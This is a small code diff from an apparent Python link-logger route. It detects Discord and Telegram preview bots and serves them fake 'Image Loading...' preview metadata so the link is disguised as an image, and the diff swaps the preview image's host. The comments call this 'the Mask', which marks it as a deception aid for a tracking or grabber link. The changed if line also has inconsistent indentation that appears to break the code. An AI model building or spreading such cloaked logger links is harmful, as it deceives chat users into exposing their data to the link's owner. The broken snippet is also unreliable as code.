@@ -26,13 +26,13 @@ def logger():
     # 3. The "Mask": This tells Discord to show a preview box
     # We check if the "User-Agent" is Discord's preview bot
     user_agent = request.user_agent.string.lower()
-    if "discord" in user_agent or "telegram" in user_agent:
+   if "discord" in user_agent or "telegram" in user_agent:
         return '''
         <html>
             <head>
                 <meta property="og:title" content="Image Loading...">
                 <meta property="og:description" content="Tap to view full image">
-                <meta property="og:image" content="https://media.tenor.com/6X97_To7m_kAAAAC/discord-loading.gif">
+                <meta property="og:image" content="https://i.ibb.co/Lkv788Z/discord-loading.gif">
                 <meta name="twitter:card" content="summary_large_image">
             </head>
             <body style="background-color: #36393f;"></body>
